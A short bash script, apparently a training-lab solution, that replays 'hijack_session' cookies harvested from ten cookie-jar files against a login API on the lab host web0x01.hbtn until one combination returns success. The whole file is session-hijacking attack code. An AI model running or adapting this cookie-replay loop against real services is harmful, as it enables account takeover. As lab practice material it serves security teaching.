#!/bin/bash

i=1
while [ "$i" -le 10 ]
do
  j=1
  while [ "$j" -le 10 ]
  do
    if [ "$i" -ne "$j" ]
    then
      HIJ=$(awk '/hijack_session/ {print $NF}' "j$j.txt")

      RES=$(curl -s \
        -b "j$i.txt" \
        -H "Content-Type: application/json" \
        -H "Cookie: hijack_session=$HIJ" \
        -d '{"email":"a@a.com","password":"a"}' \
        http://web0x01.hbtn/api/a1/hijack_session/login)

      echo "j$i + hijack from j$j -> $RES" | grep -q '"status":"success"'
      if [ "$?" -eq 0 ]
      then
        echo "FOUND with j$i and hijack from j$j"
        echo "$HIJ"
        echo "$RES"
        exit 0
      fi
    fi
    j=$((j + 1))
  done
  i=$((i + 1))
done

echo "No success with 10 jars"
exit 1
